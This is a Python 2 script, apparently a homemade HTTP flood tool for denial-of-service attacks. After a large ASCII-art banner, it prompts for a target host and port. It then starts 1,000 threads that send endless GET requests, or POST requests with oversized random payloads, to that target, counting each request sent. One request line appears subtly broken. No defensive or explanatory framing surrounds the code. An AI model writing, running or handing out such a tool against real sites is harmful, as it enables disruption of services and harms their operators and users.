import socket, httplib, threading, random, urllib
headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
print"""\033[92m

  ################################
  
    OOOOOOOOOOOOOOOOOOOO    OOOOOOOOOOOOOOOOOOOO     OOOOOO        OOOOOO     OOOOOOOOOOOOOOOOOOO                          000000000000000000000
    OOOOOOOOOOOOOOOOOOOO    OOOOOOOOOOOOOOOOOOOO     OOOOOO        OOOOOO     OOOOOOOOOOOOOOOOOOO                           0000000000000000000
                 000000     000000                   000000        000000     000000                                            00000000000000000
                000000      000000                   000000        000000     000000                                              00000000000000000
               000000       000000                   000000        000000     000000                                                00000000000000000
              000000        00000000000000000000     000000        000000     0000000000000000000                                     00000000000000000
             000000         00000000000000000000     000000        000000     0000000000000000000                 00000000000000000000000000000000000000
            000000          000000                   000000        000000                  000000                  000000000000000000000000000000000000                
           000000           000000                   000000        000000                  000000                   000000000000000000
          000000            000000                    000000000000000000                   000000                    0000000000000000
         000000             00000000000000000000       0000000000000000       0000000000000000000                     0000000000000
        000000              00000000000000000000        00000000000000        0000000000000000000                       000000000000
       000000                                                                                                             00000000000
      000000                                                                                                                0000000000
     00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                             000000000
   000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                0000000
                                                                                                                                  000000
 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                        00000
 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                              0000
                                                                                                                                        000
                                                                                                                                          00
                                                                                                                                            0


















  
  ################################  """
i=0

def h(s):
    l = ''
    for i in range(0, s):
        a = random.randint(65, 160)
        l += chr(a)
    return(l)
    
def cr():
 print'\n\n[*] creating random strings...'
 global li 
 li=[]
 for o in range(1000):
  z=h(random.randint(5,10))
  li.append(z)
 return(li)

def en():
 print '\n[*]encoding strings...'
 global lis
 lis=[]
 for v in li:
  q= urllib.urlencode({'search': v*1000})
  lis.append(q)
 return(lis)

def k():
 global i
 i+=1
 print'\033[92mrequests sent:', i

cr()
en()
print'\n[*]done!!!\n\n'

u=raw_input('TARGET:\n(www.example.com)\n>')
p=input('port:\n>')
b=input('options:\n 1-GET\n 2-POST\n>')
c=input('use the host as proxy?\n 1-yes (slower)\n 2-no (faster)\n>')

def so():
 try:
  conn = httplib.HTTPConnection(u, p)
  if c==1:
   conn.request("GET", 'http://'+u'/')
   k()
  elif c==2:
   conn.request("GET", '/')
   k()
 except socket.error as e:
   print'\033[91m',e
   
def so2():
 try:
    params = random.choice(lis)
    conn = httplib.HTTPConnection(u, p)
    if c==1:
     conn.request("POST", 'http://'+u+'/', params, headers)
     k()
    elif c==2:
     conn.request("POST", '/', params, headers)
     k()
 except socket.error as e:
    print'\033[91m',e
    
class HTTPThread(threading.Thread):
	def run(self):
		try:
		 if b==1:
		  while True:
		   so()
		 elif b==2:
		  while True:
		   so2()
		except Exception, ex:
			pass

for x in range(1000):
   t = HTTPThread()
   t.start()
